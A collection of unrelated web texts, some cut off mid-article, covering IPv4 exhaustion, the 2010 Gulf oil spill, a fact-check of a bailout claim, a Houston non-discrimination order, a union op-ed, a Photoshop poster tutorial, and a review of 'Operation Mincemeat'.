An IANA global resource policy calls for the remaining five / 8s to be immediately distributed to the RIRs as soon as that trigger point is reached , which ARIN believes will likely occur in 2011 , although current usage suggests it could happen later this year .
" When that happens , we have a reserved / 10 block [ 4.2 million IP addresses ] set aside for organizations that run IPv6 but need one or two IP v4 addresses for protocol transition , " Jimmerson says .
Except for this reserve pool , however , Jimmerson expects the last addresses will be issued by registries anywhere from one day to six months after this IANA trigger occurs .
IP v4 black market : Escaping the black Both Jimmerson and Oberman agree that businesses have no time to lose in moving to IPv6 .
While IP v4 will be needed for the foreseeable future , the sooner the Internet community abandons this legacy protocol , the less impact any potential black market could have on Internet commerce .
They predict that many new servers will be IPv6 - exclusive , gradually isolating IPv4 - only Internet users .
The trail to IP v6 is well blazed .
ICANN ( Internet Corporation for Assigned Names and Numbers ) added IP v6 to its root name servers back in 2004 .
Federal agencies largely met a mid-2008 deadline to support IP v6 , which first became operational on the Internet that year .
All major server and desktop operating systems -- Windows , Unix , Linux , and Mac OS X -- have supported IP v6 for several years , as have major Internet client applications such as Internet Explorer , Safari , Chrome , and others .
Most network equipment has IP v6 built - in .
Thus , nothing stands between business and the exodus to IPv6 -- an exodus that has accelerated over the past year or so , according to Jimmerson and ISP reports .
Only one question remains : Can we get out in time ?

Tests have shown that underwater oil plumes have travelled at least 40 miles from a leaking well in the Gulf of Mexico , the US government says .
Scientists noted that concentrations of oil in the plumes were " very low . "
Meanwhile , US Coast Guard chief Thad Allen has said a containment cap placed on a blown - out well in the Gulf of Mexico last week is helping to contain more of the leaking oil .
President Barack Obama has criticised BP 's chief executive over the disaster .
Mr Obama told US network NBC that he would have fired Tony Hayward over remarks the British chief executive made on behalf of BP .
Jane Lubchenco , the head of the US National Oceanic and Atmospheric Administration ( NOAA ) , said water samples had been taken at three sites by a University of South Florida research vessel .
The BP oil spill is a human tragedy and an environmental disaster Jane Lubchenco , NOAA chief
Surface samples confirmed the presence of low concentrations ( five parts per million ) of oil 40 miles ( 64 km ) away from the BP site .
Ms Lubchenco told the Associated Press ( AP ) news agency that officials had finished " fingerprinting " the oil in order to confirm that it came from the BP spill .
" We 've been tracking where the oil is going at the surface and where it is going below the surface , " said Ms Lubchenco said .
" The BP oil spill is a human tragedy and an environmental disaster . "
NOAA 's testing backs up reports from scientists at a number of universities who had suggested that plumes of oil were suspended beneath the surface of the Gulf .
Scientists warn that oil plumes are very difficult to clean up , and they could damage the Gulf 's abundant sea life by depleting oxygen in the water .
BP said 10 days ago that its own testing had found " no evidence " of large plumes of oil underwater .
" The oil is on the surface , " Mr Hayward is quoted by AP as saying on 30 May .
" There are n't any plumes . "
' Optimise production '
Adm Allen said in a press conference on Tuesday that BP had contained more than 14,800 barrels of oil from the leaking wellhead in the past 24 hours .
" We continue to optimise production , make sure we can take as much oil out of that stream as we can right now , " said Adm Allen .
Oil from the Deepwater Horizon spill has been found on beaches and wetlands along more than 100 miles ( 161 km ) of coast from Louisiana to the Florida Panhandle .
A containment cap was lowered over the well last week to siphon off the oil to a containment ship .
Oil has been leaking into the Gulf of Mexico since the Deepwater Horizon rig exploded and sank off the coast of the US state of Louisiana on 20 April .
Sen .
Mitch McConnell said that new financial regulations under consideration in the Senate could lead to only one thing : bailouts .
" In fact , if you look at it carefully , it will lead to endless taxpayer bailouts of Wall Street banks , " McConnell said at a press conference on April 14 , adding that it " actually guarantees future bailouts of Wall Street banks " and that it sets up " in perpetuity the potential for additional taxpayer bailouts of large institutions . "
Those comments must have sounded like fighting words to President Barack Obama .
He directly rebutted McConnell , the leader of the Senate Republicans , in his weekly address .
McConnell has " made the cynical and deceptive assertion that reform would somehow enable future bailouts – when he knows that it would do just the opposite , " Obama said .
The debate is critical because voters hate bailouts .
In fact , Republican pollster Frank Luntz advised opponents of regulation that " the single best way to kill any legislation is to link it to the Big Bank Bailout . "
We wanted to check McConnell 's claim that the new financial regulation " actually guarantees future bailouts of Wall Street banks " and that it would be at taxpayer expense .
The financial regulations under consideration in the Senate do a number of things :
The government receives additional authority to regulate over - the - counter derivatives and hedge funds .
A new consumer protection agency within the Federal Reserve will regulate financial products .
And the bill creates a process for federal authorities to dissolve financial institutions that are teetering on collapse .
It 's that last item that seems to be attracting McConnell 's ire .
He said the bill was " taking that experience in the fall of 2008 and institutionalizing it , setting up in perpetuity the potential for additional taxpayer bailouts of large institutions . "
The official name of that part of the bill is " Orderly Resolution Authority . "
It sets up a panel of three bankruptcy judges who convene and agree within 24 hours about whether a large financial company is insolvent .
If a " systematically significant " firm is teetering on collapse , the Treasury , the Federal Deposit Insurance Corp . and the Federal Reserve would have to agree to liquidate the firm , using a special fund created with payments from the largest financial firms .
The FDIC " shall impose assessments on a graduated basis , with financial companies having greater assets being assessed at a higher rate , " according to the legislation .
We should clarify that there will be no change for small , mid-sized and even fairly large banks .
When they 're in trouble , there 's already a well - established mechanism , under FDIC authority , that is not considered a bailout .
Instead , the " bailouts " at issue are those for the small number of very large , highly interconnected institutions -- those sometimes called " too big to fail " because their collapse would severely impact the rest of the economy .
The legislative language says that the money must be used to dissolve -- meaning completely shut down -- failing firms .
Here 's what Sec. 206 of the bill says :
" In taking action under this title , the ( FDIC ) shall determine that such action is necessary for purposes of the financial stability of the United States , and not for the purpose of preserving the covered financial company ; ensure that the shareholders of a covered financial company do not receive payment until after all other claims and the Fund are fully paid ; ensure that unsecured creditors bear losses in accordance with the priority of claim provisions in section 210 ; ensure that management responsible for the failed condition of the covered financial company is removed ( if such management has not already been removed at the time at which the FDIC is appointed receiver ) ; and not take an equity interest in or become a shareholder of any covered financial company or any covered subsidiary . "
We spoke with several experts specifically about the fund in a previous report , where we fact - checked Republican Sen .
Richard Shelby 's statement that the fund is " available for virtually any purpose that the treasury secretary sees fit . "
The consensus of the experts was that the legislation put forward numerous rules on how the fund is to be used , with the express purpose of liquidating -- that is , shutting down -- failing firms .
We rated Shelby 's statement False .
McConnell said that the bill " actually guarantees future bailouts of Wall Street banks . "
One of the sticking points here , of course , is the word bailout .
We should acknowledge that free - market purists might see any intervention of the government into the financial sector as a " bailout . "
However , we think the more common understanding of the word means that the federal government gives or lends a company money to help it stay in business .
Merriam - Webster , for example , defines a bailout as " a rescue from financial distress . "
We do n't see how the liquidation of a company could constitute a " rescue . "
In fact , the bill pays for the so - called " orderly liquidation " by assessing a fine on the firms themselves , not general revenues , a situation somewhat similar to the way the FDIC has handled failing banks for many years now , using fees it collects from other banks to pay for orderly shutdowns .
On the question of bailouts , we spoke to a variety of financial - services experts , and most ( though not all ) agreed that the bill would be a step in the right direction , in all likelihood reducing the risk of having the government having to undertake another bailout .
That 's the case in part because the bill aims to heighten regulation in advance so that problems do n't emerge in the first place .
Sen .
Bob Corker , a Republican , helped draft the orderly liquidation measures in the bill , and he has been arguing against McConnell 's assertions that the bill allows bailouts .
He was asked about the bill on MSNBC's Morning Joe on April 20 .
" Does it ensure future bailouts as Mitch McConnell suggests ? " asked host Joe Scarborough .
" There are some loopholes in the bill , no question , " Corker replied .
" But generally speaking , the central elements of the bill absolutely do the opposite . "
Corker gave an extended speech on the floor of the Senate the day before , discussing many details of the bill , including the $ 50 billion fund .
" This fund that has been set up is anything but a bailout , " Corker said .
" It has been set up in essence to provide upfront funding by the industry so that when these companies are seized , there is money available to make payroll and to wind it down while the pieces are being sold off . "
( By the way , Corker has asked both Democrats and Republicans to cool down some of their rhetoric on financial reform . )
The experts we spoke with , however , said they believed a $ 50 billion fund might not be enough to wind down a large failing firm with a global reach .
For a truly large and interconnected institution , several sources said , $ 50 billion probably wo n't be enough to do an " orderly liquidation . "
Arthur E. Wilmarth Jr. , a law professor at George Washington University , said that given past history , that figure is " laughable " and that " $ 300 billion would be the minimum reasonable starting point . "
We should add here that the bill is something of a moving target .
There is speculation that the fund might be dropped from the bill , since it was n't in the White House 's original proposal .
The Senate version will have to work out differences with the bill passed in the U.S. House of Representatives if it's to become law .
In ruling on McConnell 's statement , that financial reform " actually guarantees future bailouts of Wall Street banks , " we base our ruling primarily on the legislation .
It clearly states that the intention is to liquidate failing companies , not bail them out .
To do that , it creates a fund with contributions from financial firms , not from taxpayer funds .
We do not see any element of the bill that expressly permits ongoing , " endless " outlays from the federal treasury .
Is it possible that liquidation may cost the government money , potentially more money than is allowed for in the bill ?
Yes .
But even so , McConnell is using seriously overheated rhetoric .
Nothing in the bill " guarantees " future bailouts of Wall Street banks .
We rate his statement False .
Houston Mayor Annise Parker has signed an executive order that adds gender identity to the city 's 12 - year - old non-discrimination policy , the Houston Chronicle reported .
The two orders signed by Parker protect transgender individuals who work for the city from discrimination in the areas of employment and accommodations .
“ The mayor wanted to put in writing what has already been the city 's practice , which is that we do not discriminate , ” Janice Evans , Parker 's spokeswoman , told the paper .
Gay rights advocates cheered the move .
“ This is essential ” Kris Banks , president of the Houston Gay , Lesbian , Bisexual and Transgender Political Caucus , said .
“ A non-discrimination provision that protects sexual orientation but does n't protect gender identity is toothless . …
It 's quite a thing , having a mayor that really understands all these issues . ”
Parker , 53 , became Houston 's 61st mayor in January after a long campaign that included personal attacks against Parker because she is openly gay .
Dave Wilson , an outspoken gay rights opponent who campaigned to make Parker 's sexuality an issue during the mayoral campaign , said he was “ sad this is happening in our city . ”
The new protections allow transgender individuals employed by the city to use restroom facilities in city - owned buildings for the gender with which they identify .
Previously , the city decided the issue on a case - by - case basis .
Opponents say such measures allow men to legally enter women 's restrooms , putting women and children at risk .
Proponents counter that such behavior would be criminal .

Massimo solitando enviar Arduino a la Expo 2010
It commended the New York Police Department for initiating a program , in the wake of the Edwards shooting , to test officers for unconscious racial bias , something Mr. Stone said he hoped would be replicated across the country .
Laurie O. Robinson , assistant attorney general for the Office of Justice Programs in the Justice Department , said the recommendations were something it would “ review and consider very seriously . ”
She said she had shared them with colleagues .
The recommendations are aimed at “ blunting ” any unconscious racial bias , Mr. Carter said .
They call for establishing protocols for off - duty conduct , increasing testing for racial bias among officers and improving how police departments manage such encounters when they occur within their ranks .
One focused on prosecutors , calling for them to disclose publicly as much detail as possible about such encounters , and early on , to avoid having facts disappear in a fog of grand jury secrecy .
The 67 - page report outlined the facts of the Edwards and Ridley shootings , as well as some of the 24 other fatal encounters since 1981 .
The task force spoke with current and former officers .
It drew on three public hearings held around the state — in Albany in November and in Harlem and in White Plains in December .
It identified several trends in reviewing the cases and in analyzing existing research on the topic .
Most of the 26 victims were male .
Of the 10 off - duty victims , 8 worked in plainclothes , and 6 worked undercover .
Of the 26 fatal shootings , 5 , including Officer Ridley ’s case , involved an off - duty officer who came across a crime in progress and moved to help other officers or a civilian , the report found .
In five other cases , including the Edwards shooting , an off - duty officer was a crime victim and then tried to make an arrest or to take police action , the report found .
The only other New York City case the group studied involved Officer Eric Hernandez , who was off duty when he was shot by a colleague who responded to a 911 call and saw him in the aftermath of a brawl at a White Castle restaurant in 2006 .
In all but 2 of the 26 fatal shootings of officers that were examined , the victim was holding a gun and had it “ displayed ” when he or she was shot , the report found .
Indeed , it noted , “ many of the victim officers with guns displayed reportedly failed to comply with the commands of challenging officers who ordered them to freeze or to drop their weapons . ”
God may or may not be on the side of unions , but a Catholic scholars group says that being on the other side , that is being against unions , is a “ grave violation ” of the church ’s social doctrine .
Opposing unions is , in fact , a mortal sin .
And should be .
Anti-union actions violate both the letter and spirit of Catholic social doctrine , declared the Massachusetts - based Catholic Scholars for Worker Justice in a document distributed recently by the Catholic News Service .
Specifically , say the scholars , it violates church doctrine to try to block union organizing campaigns , stall in union contract talks , unilaterally roll back wages and benefits and violate existing labor contracts and other labor - management agreements .
Those tactics are far too commonly used against unions by far too many employers , including many who are Catholic and presumably follow church teachings .
That ’s not to mention the lay employers who operate Catholic hospitals and other facilities for the church and are openly ­ sometimes fiercely ­ anti union .
The Catholic scholars make an irrefutable case .
As they say , Catholic social doctrine is “ forthright and unambiguous ” in regard to unions .
“ It states boldly that they are essential to the universal common good . ”
The scholars note that in supporting unions , the church is supporting the vital philosophical principle of freedom of association and the vital moral principle of “ a just and or living wage . ”
From the scholars ’ point of view , it boils down to this : “ The right to form unions is rooted in divine law , ” and man-made law and the enforcement of it should reflect that .
Opposing unions ­ that is , opposing the workers ’ natural right of free assembly and right to decent wages and benefits – harms not only the workers directly involved .
It also hurts society - at - large by lessening overall income and social solidarity and thus diminishing the universal common good .
The scholars ’ statement stemmed primarily from concern over an increase in the use of anti-union tactics in recent years by some Catholic dioceses and Catholic organizations that obviously are not practicing what they preach .
“ There are many Catholic institutions that live up to Catholic teachings , ” said Joseph Fahey , a Manhattan College professor of religious studies who chairs Catholic Scholars for Worker Justice .
“ But there are some , either by ignorance or by design , that ignore Catholic teaching . ”
Those who violate workers ’ rights of unionization , added Fahey , “ are involved in the grave matter of mortal sin . ”
Fahey and his fellow scholars are particularly critical of the sponsors and managers of Catholic institutions who hire “ union avoidance firms ” to help them block their employees from unionizing or to help employers oust – or “ bust ” – unions that previously won the legal right to represent their employees on setting pay , benefits and working conditions .
Ousting or breaking unions in that way – or any other way – amounts to “ wage theft ” and “ the theft of the human right of free association , ” say the scholars .
Whatever your religion , or lack of it , you have to agree they ’re absolutely correct .
You have to agree there ’s a great need for the spread of unionization to bring about the truly just society that the Catholic scholars , the nation ’s union leaders and members and so many others of varying backgrounds seek .

New Highrez 2015 version .
Not quite identical to original .
Just the image - no text .

I hereby ( 18 March 2016 ) release my FSM paintings into Public Domain .
Do with them as you wish .
However , know that I have no intention of fiddling with official merchandise .
If you see something out there , some rando probably just made an account on a merc website and uploaded the image and is now making money of it .
Touched for the very first time
Aug. 2 , 2005 , Morning -
At this time , the FSM had just gone ' viral ' .
His meme version had just gotten a reproduction organ so to speak .
Though already incredibly potent , I thought I 'd give Him even greater balls .
Yes , that was a terrible , terrible forced pun .
Anyways , all that existed at the time was the pencil drawing by Bobby .
I 'm not sure how I got the idea to use the Sistine Chapel painting , but I 'm guessing that the FSM had a noodle in it .
In fact , now when I think about it , I clearly remember the sky opening up , and me floating up into a beam of light .
His Noodles , spreading out radially , as if to embrace .
There was a great thundering message filling my mind : HeLL0 : DDDDD !!!!
CNA U DRAWw ME A PIC I CANT PAY ANYTINGBUT PLEEEZA I WANT A ROBOT RIDING A HUGE MONSTAH THAT IS NOW ITS GETTN CONFUSTING CAOZ3 I CANT TaPE OR SPELL OR USE PUNCTUATION !!!!
1111 !
But then of course I painted something else instead .
The painting took about 3 - 5 hours , and in retrospect I think I should 've spent a few more hours on it , and used a larger canvas .
Sep. 29 , 2008 , Evening -
To remedy that somewhat , I have now reworked the painting of the FSM itself .
The original painting only was some 500 pixels high ( due to the meager size of the Sistine Chapel photo ) .
I realize that some day someone might present me with a photo of a higher resolution , so I undertook some restoration work and increased the resolution to 5000 Glorious pixels and also ' masked ' all the edges of His / Her / Its Most Holy Noodly figure .
2015 , sometime - I finally did a highrez version .
Did n't upload until March 2016 though .
Additional downloads
Since my new 5000 pixel image is 60 MB , I 've uploaded a much smaller version here .
It 's a 1000 pixel high image of just the FSM .
The background is transparent .
It 's saved using Photoshop CS3 , resulting in a 3.8 MB .
PSD , which is 2.5 MB ZIP'ed .
Right Click , Save
The wallpaper I made in ' 05 , but with a newer , crisper FSM from ' 08 .
These versions were quite lowrez , even more so now with 4 K screens and such .
It never printed well .
HD Widescreen Radiant Glory .
It 's easy to used the masked image to make stuff like this , but since the Noodles are fogged with white , using a dark background is probably not a good idea .
Perhaps I should make another version for that purpose .
Yet another project
Chibi
I have n't had much time to work on this , but I have a little comic project .
The setting involves wooden teapot - shaped spaceships and space faring balloonists .
Naturally , there 's air or ' aether ' in space .
Cannonballs are the weapon of choice .
Diligent Noodlings man the ship .
I decided to go for a home - made FSM costume feel .
Somewhat inspired by the Nendoroid figurines .
Rough concepts .
The ship is inspired by a story by Bob Shaw ( The Wooden Spaceships , Land and Overland Trilogy ) .
Isometric view to illustrate the deck .
The ship is driven through the aether by a flagellum / noodle - like chain ( cropped here , it 's about twice as long as the ship ) .
Perhaps the front gun is a large harpoon .

This remarkably elegant vintage motorcycle is actually a bit of a mongrel : it ’s a Rudge Whitworth ‘ bitsa ’ built by Jean - Claude Barrois , who also restored the Honda CB450 we ’ve featured before .
This bike has had a chequered life , starting out as a 1928 Soyer — a French brand that produced motorcycles between 1920 and 1935 .
Like many French makes of the time , Soyer used a variety of engines for their motorcycles , including JAP , Sturmey Archer and Chaise .
This particular Soyer 07S had a JAP engine but the frame was wrecked , so Barrois built his own frame — and eventually replaced the JAP motor with the 500 cc Rudge unit you see here .
All unnecessary parts have been removed to make it lighter — including the front brake — and a new quarter - gallon tank has been added , along with a “ suicide knee ” gearshift .
Since this photo session two small fenders have been added , and the tires have been changed for modern high - speed Avons .
After optimizing the ignition system to gain a better spark , Jean - Claude packed the Rudge into a container and flew to Salt Lake City for the Bonneville Speed Week .
The photos , if you have n’t already guessed , are from Guerry & Prat — who can always be relied upon to deliver beautiful images of unusual motorcycles .

Combine stock photos and design resources to create an awesome retro sci- fi themed game poster that takes inspiration from Atari games of the 80s .
By mixing up bright and vibrant cosmic designs with old , distressed and grungey textures we ’ll create a retro futuristic poster design for ‘ Galactic Attack ’ .
Research and inspiration
I knew from the start what theme and style of poster I wanted to create , but to further develop my ideas I took to the web to research my chosen theme in order to pick out common design elements which would help tailor my design to the style I was after .
A quick search for Atari games and retro sci- fi movies soon brought up plenty of creative ideas to start with .
Here ’s a quick mood board I put together for the theme of retro sci-fi .
Open up Adobe Photoshop and create a document at your desired poster dimensions .
Remember to use a high DPI ( 150 -300 ) if you ’re looking at having your design printed .
Fill the background with black , then dab a couple of spots of dark blue in opposite corners .
Find an old paper scan , such as this one from SXC .
Paste it into the document and desaturate .
Run a quick Sharpen ( Filter > Sharpen ) command to give more definition to the texture .
Change the blending mode to Soft Light at 50 % .
Switch over to Illustrator to create a vector resource .
Draw a rectangle onto the artboard at the same dimensions as your poster , then go to Object > Path > Split into Grid .
Change the gutter setting to zero , then adjust the number of rows and columns until the grid squares are equal in size .
Change the black stroke to white , then paste the grid into Photoshop .
Add an Outer Glow of a bright Cyan , with the blending mode Color Dodge .
Give the layer of the grid a blending mode of Soft Light to allow the colours to interact with the blue tints in the background .
Open up a photograph of the moon and paste it into the document .
Change the blending mode to Color Dodge , then lower the opacity to 20 % .
Use the Brush tool to dab a large spot of white over the planet .
Change this layer ’s blending mode to Overlay to give a vibrant lighting effect .
Duplicate the grid layer , then add a layer mask to the new copy .
Use a large soft brush to erase out areas of the duplicated grid to give varying levels of vibrance across the poster .
This handy photograph of a rocket engine will fit perfectly as our sci- fi cannon .
Open up the shot in a new document and clip out the object with the Pen Tool .
Paste the cannon into the document and scale into place .
Position it in the bottom right corner , so it fits within the grid area .
Change the blending mode to Linear Light , then duplicate the layer .
On the duplicate , go to Filter > Blur > Motion Blur .
Adjust the angle to follow the direction of the cannon and adjust the amount to around 100 px .
Drop the opacity of this layer to 50 % .
Use a soft brush to roughly draw a bright pink explosion .
Change the blending mode to Exclusion at 50 % to allow the pink to recolour the underlying artwork .
Download a simple explosion graphic and open it up in Photoshop .
Desaturate the graphic , then change the blending mode to Lighten at 5 % .
This will add a subtle texture and impression of exploding motion .
On a new layer , use the Brush tool to draw a laser trial and start of the explosion .
Change the layer ’s blending mode to Color Dodge to allow the colours to interact .
Add a large spot of white to the end of the cannon , change the blending mode to Overlay .
Find a photograph of some lightning .
Paste the shot into Photoshop then scale and rotate to follow the line of the laser shot .
Change the blending mode to Color Dodge , then add a layer mask to erase out any hard edges or corners from the photograph .
Switch back to Illustrator and quickly draw a Heptagon with the Polygon Tool .
Give it a white stroke then paste into Photoshop .
Position the Heptagon into place as a target marker , then double click the layer to add an Outer Glow style .
Use a bright Cyan with the Color Dodge blending mode to create the feel of a sci- fi computer display or HUD .
Paste in another Heptagon , this time scale it so it ’s slightly larger than the original .
Rotate it slightly to give the impression of a radial movement .
Continue creating and pasting various geometric shapes into the document .
Give each one the same layer style by right clicking the original target layer and selecting Copy Layer Style , then Paste Layer Style on the following shapes .
Mix in a couple of triangles and circles to add variety .
Use some star brushes to paint in a cosmic background .
Adjust the brush settings to that the brush scatters and varies in size .
Change the blending mode to Soft Light .
Download a detailed cosmic photograph , then paste it into the document .
Change the blending mode to Overlay at 50 % to allow the textures and colours to interact with the design .
Add a grungey border to the design with some tape brushes .
Adjust the angle from the Brushes palette , then paint over the edges of the document .
Open up Illustrator once again and create a title logo for our retro game .
Galactic Attack sounds like a typical Atari game from the 80s !
A sci-fi font such as Viper Squadron makes a fitting design .
Paste the logo into the document , then add a Drop Shadow to allow the title to pop .
Next , add a bright blue Inner Glow .
Change the settings to Normal at around 20 px .
Finally , a large pink stroke with the blending mode of Overlay gives an outline that interacts and blends with the underlying design .
Hold CMD and click the layer thumbnail of the logo , then Hold the ALT key while dragging with the layer mask to remove a portion of the selection .
On a new layer fill the selection with a gradient .
We ’re aiming for that retro chrome look that ’s typical to the 80s , so use samples of purple from the design .
Repeat the process for the first word to finish off the logo .
Press CMD+A to select all , then Copy Merged ( CMD + Shift +C ) .
Paste the clipping onto a new layer , then go to Filter > Noise > Add Noise .
Enter around 20 % , and change the blending mode to Screen at 30 % .
This step helps add that detailed texture often associated with old prints .
Finish off the design with some typical game branding .
I ’m taking inspiration from my old Atari 2600 games from my childhood .
The final poster design fits right in as a retro sci - fi game .
The bright and vibrant colours help give that futuristic space theme , while the various textures and outdated design styles send it right back to the 80s era .

Sony has announced the development of a highly efficient RGB laser light source module that , thanks to its high scalability , is suitable for use with projectors of all sizes and promises outstanding performance as well as power efficiency .
The module incorporates high - power lasers with a combined output power of 21W in a single , small package .
The module uses semiconductor diodes for the red and blue lasers , and a compact , high power solid - state SHG laser for the green .
The technology for both the red and green lasers was developed by Sony and allows for an overall 110W energy consumption at 5,000 lumens ( or 21W ) , for a very respectable 18 % energy conversion ratio — which is very high for power visible lasers .
One of the great features of the device is its scalability , as multiple modules can be stacked and used for 10,000 lumen large screen projectors and even digital cinema projectors , while obtaining noticeably higher brightness , better contrast and a wider color gamut compared with traditional xenon lamps .
Higher energy efficiency means the cooling mechanisms could be simplified to allow for a smaller size ( 152 mm x 114 mm x 30.5 mm ) and , with an average lifespan of 10,000 hours , the laser module is between 3 and 20 times more durable than traditional xenon lamps , cutting maintenance costs considerably .

MONTGOMERY , Ala . --
Legislation legalizing the making of beer and wine at home for personal use has won approval in the Alabama Senate .
The Senate voted 13 - 6 Tuesday for the bill sponsored by Republican Sen. Larry Dixon of Montgomery .
The bill now goes to the House .
The bill also allows homemade wine and beer to be transported to organized tasting and judging events .
It limits the amount of beer being transported to 20 gallons .
Proponents said the bill recognizes that home brewing is an increasingly popular hobby in Alabama .
On April 30 , 1943 , a fisherman came across a badly decomposed corpse floating in the water off the coast of Huelva , in southwestern Spain .
The body was of an adult male dressed in a trenchcoat , a uniform , and boots , with a black attaché case chained to his waist .
His wallet identified him as Major William Martin , of the Royal Marines .
The Spanish authorities called in the local British vice - consul , Francis Haselden , and in his presence opened the attaché case , revealing an official - looking military envelope .
The Spaniards offered the case and its contents to Haselden .
But Haselden declined , requesting that the handover go through formal channels — an odd decision , in retrospect , since , in the days that followed , British authorities in London sent a series of increasingly frantic messages to Spain asking the whereabouts of Major Martin ’s briefcase .
In the months before the invasion of Sicily , British spies fooled German spies with a caper inspired by a detective novel .
Illustration by John Ritter
It did not take long for word of the downed officer to make its way to German intelligence agents in the region .
Spain was a neutral country , but much of its military was pro-German , and the Nazis found an officer in the Spanish general staff who was willing to help .
A thin metal rod was inserted into the envelope ; the documents were then wound around it and slid out through a gap , without disturbing the envelope ’s seals .
What the officer discovered was astounding .
Major Martin was a courier , carrying a personal letter from Lieutenant General Archibald Nye , the vice - chief of the Imperial General Staff , in London , to General Harold Alexander , the senior British officer under Eisenhower in Tunisia .
Nye ’s letter spelled out what Allied intentions were in southern Europe .
American and British forces planned to cross the Mediterranean from their positions in North Africa , and launch an attack on German - held Greece and Sardinia .
Hitler transferred a Panzer division from France to the Peloponnese , in Greece , and the German military command sent an urgent message to the head of its forces in the region : “ The measures to be taken in Sardinia and the Peloponnese have priority over any others . ”
The Germans did not realize — until it was too late — that “ William Martin ” was a fiction .
The man they took to be a high - level courier was a mentally ill vagrant who had eaten rat poison ; his body had been liberated from a London morgue and dressed up in officer ’s clothing .
The letter was a fake , and the frantic messages between London and Madrid a carefully choreographed act .
When a hundred and sixty thousand Allied troops invaded Sicily on July 10 , 1943 , it became clear that the Germans had fallen victim to one of the most remarkable deceptions in modern military history .
The story of Major William Martin is the subject of the British journalist Ben Macintyre ’s brilliant and almost absurdly entertaining “ Operation Mincemeat ” ( Harmony ; $ 25.99 ) .
The cast of characters involved in Mincemeat , as the caper was called , was extraordinary , and Macintyre tells their stories with gusto .
The ringleader was Ewen Montagu , the son of a wealthy Jewish banker and the brother of Ivor Montagu , a pioneer of table tennis and also , in one of the many strange footnotes to the Mincemeat case , a Soviet spy .
Ewen Montagu served on the so - called Twenty Committee of the British intelligence services , and carried a briefcase full of classified documents on his bicycle as he rode to work each morning .
His partner in the endeavor was a gawky giant named Charles Cholmondeley , who lifted the toes of his size - 12 feet when he walked , and , Macintyre writes , “ gazed at the world through thick round spectacles , from behind a remarkable moustache fully six inches long and waxed into magnificent points . ”
The two men coördinated with Dudley Clarke , the head of deception for all the Mediterranean , whom Macintyre describes as “ unmarried , nocturnal and allergic to children . ”
In 1925 , Clarke organized a pageant “ depicting imperial artillery down the ages , which involved two elephants , thirty - seven guns and ‘ fourteen of the biggest Nigerians he could find . ’
He loved uniforms , disguises and dressing up . ”
In 1941 , British authorities had to bail him out of a Spanish jail , dressed in “ high heels , lipstick , pearls , and a chic cloche hat , his hands , in long opera gloves , demurely folded in his lap .
He was not supposed to even be in Spain , but in Egypt . ”
Macintyre , who has perfect pitch when it comes to matters of British eccentricity , reassures us , “ It did his career no long - term damage . ”
To fashion the container that would keep the corpse “ fresh , ” before it was dumped off the coast of Spain , Mincemeat ’s planners turned to Charles Fraser - Smith , whom Ian Fleming is thought to have used as the model for Q in the James Bond novels .
Fraser - Smith was the inventor of , among other things , garlic - flavored chocolate intended to render authentic the breath of agents dropping into France and “ a compass hidden in a button that unscrewed clockwise , based on the impeccable theory that the ‘ unswerving logic of the German mind ’ would never guess that something might unscrew the wrong way . ”
The job of transporting the container to the submarine that would take it to Spain was entrusted to one of England ’s leading race - car drivers , St. John ( Jock ) Horsfall , who , Macintyre notes , “ was short - sighted and astigmatic but declined to wear spectacles . ”
At one point during the journey , Horsfall nearly drove into a tram stop , and then “ failed to see a roundabout until too late and shot over the grass circle in the middle . ”
Each stage of the deception had to be worked out in advance .
Martin ’s personal effects needed to be detailed enough to suggest that he was a real person , but not so detailed as to suggest that someone was trying to make him look like a real person .
Cholmondeley and Montagu filled Martin ’s pockets with odds and ends , including angry letters from creditors and a bill from his tailor .
“ Hour after hour , in the Admiralty basement , they discussed and refined this imaginary person , his likes and dislikes , his habits and hobbies , his talents and weaknesses , ” Macintyre writes .
“ In the evening , they repaired to the Gargoyle Club , a glamorous Soho dive of which Montagu was a member , to continue the odd process of creating a man from scratch . ”
Francis Haselden , for his part , had to look as if he desperately wanted the briefcase back .
But he could n’t be too diligent , because he had to make sure that the Germans had a look at it first .
“ Here lay an additional , but crucial , consideration , ” Macintyre goes on .
“ The Germans must be made to believe that they had gained access to the documents undetected ; they should be made to assume that the British believed the Spaniards had returned the documents unopened and unread .
Operation Mincemeat would only work if the Germans could be fooled into believing that the British had been fooled . ”
It was an impossibly complex scheme , dependent on all manner of unknowns and contingencies .
What if whoever found the body did n’t notify the authorities ?
What if the authorities disposed of the matter so efficiently that the Germans never caught wind of it ?
What if the Germans saw through the ruse ?
In mid-May of 1943 , when Winston Churchill was in Washington , D.C. , for the Trident conference , he received a telegram from the code breakers back home , who had been monitoring German military transmissions : “ MINCEMEAT SWALLOWED ROD , LINE AND SINKER . ” Macintyre ’s “ Operation Mincemeat ” is part of a long line of books celebrating the cleverness of Britain ’s spies during the Second World War .
It is equally instructive , though , to think about Mincemeat from the perspective of the spies who found the documents and forwarded them to their superiors .
The things that spies do can help win battles that might otherwise have been lost .
But they can also help lose battles that might otherwise have been won .
In early 1943 , long before Major Martin ’s body washed up onshore , the German military had begun to think hard about Allied intentions in southern Europe .
The Allies had won control of North Africa from the Germans , and were clearly intending to cross the Mediterranean .
But where would they attack ?
One school of thought said Sardinia .
It was lightly defended and difficult to reinforce .
The Allies could mount an invasion of the island relatively quickly .
It would be ideal for bombing operations against southern Germany , and Italy ’s industrial hub in the Po Valley , but it did n’t have sufficient harbors or beaches to allow for a large number of ground troops to land .
Sicily did .
It was also close enough to North Africa to be within striking distance of Allied short - range fighter planes , and a successful invasion of Sicily had the potential to knock the Italians out of the war .
Mussolini was in the Sicily camp , as was Field Marshal Kesselring , who headed up all German forces in the Mediterranean .
In the Italian Commando Supremo , most people picked Sardinia , however , as did a number of senior officers in the German Navy and Air Force .
Meanwhile , Hitler and the Oberkommando der Wehrmacht — the German armed - forces High Command — had a third candidate .
They thought that the Allies were most likely to strike at Greece and the Balkans , given the Balkans ’ crucial role in supplying the German war effort with raw materials such as oil , bauxite , and copper .
And Greece was far more vulnerable to attack than Italy .
As the historians Samuel Mitcham and Friedrich von Stauffenberg have pointed out , “ in Greece all Axis reinforcements and supplies would have to be shipped over a single rail line of limited capacity , running for 1,300 kilometers ( more than 800 miles ) through an area vulnerable to air and partisan attack . ”
All these assessments were strategic inferences from an analysis of known facts .
But this kind of analysis could n’t point to a specific target .
It could only provide a range of probabilities .
The intelligence provided by Major Martin ’s documents was in a different category .
It was marvellously specific .
It said : Greece and Sardinia .
But because that information washed up onshore , as opposed to being derived from the rational analysis of known facts , it was difficult to know whether it was true .
